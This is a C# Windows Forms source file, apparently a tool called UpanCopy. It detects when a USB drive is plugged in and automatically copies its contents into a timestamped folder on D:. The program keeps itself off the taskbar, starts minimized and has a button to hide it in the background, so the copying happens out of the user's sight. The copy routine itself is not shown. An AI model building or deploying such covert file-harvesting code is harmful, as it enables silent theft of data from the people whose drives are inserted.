using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Security.AccessControl;

namespace UpanCopy
{
    public partial class Form1 : Form  //表层函数
    {
        public Form1()
        {
            InitializeComponent();
            //this.Visible = false;
            ShowInTaskbar = false;    //不在任务栏中显示
            WindowState = FormWindowState.Minimized; //最小化
        }

        Thread thread = null;                  //新建线程
        string drivestr;                      //驱动器名称
        public string des = @"D:\UFD\";      //拷贝来的文件的存放位置

        protected override void WndProc(ref Message m)  //主函数
        {
            const int WM_DEVICECHANGE = 0x219;
            const int DBT_DEVICEARRIVAL = 0x8000;
            const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
            if (m.Msg == WM_DEVICECHANGE)
            {
                switch (m.WParam.ToInt32())
                {
                    // case WM_DEVICECHANGE:
                    //     break;
                    case DBT_DEVICEARRIVAL:
                        {
                            thread = null;
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable)
                                {
                                    statusBox.Text = "--> U盘已插入，盘符为:" + drive.Name.ToString();
                                    drivestr = drive.Name;
                                    des = des + DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss");
                                    MakeDir(des);
                                    des = des + @"\";
                                    thread = new Thread(new ThreadStart(Copy));//线程实例化
                                    thread.Start();//启动线程
                                }
                            }
                            break;
                        }
                    case DBT_DEVICEREMOVECOMPLETE:
                        {
                            statusBox.Text = "U盘拔出";
                            thread = null;
                            des = addressBox.Text + @"\";
                            break;
                        }
                }
            }
            base.WndProc(ref m);
        }
        
        private void Button_Search_Click(object sender, EventArgs e) //浏览
        {
            folderBrowserDialog1.ShowDialog();
            addressBox.Text = folderBrowserDialog1.SelectedPath;
            des = addressBox.Text + @"\";
        }

        private void Button_Hide_Click_1(object sender, EventArgs e) //隐藏
        {
            //if (des != "")
            Hide();  //后台运行程序
                     //else
                     //    MessageBox.Show("请选择文件存放位置....", "信息", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    } 
}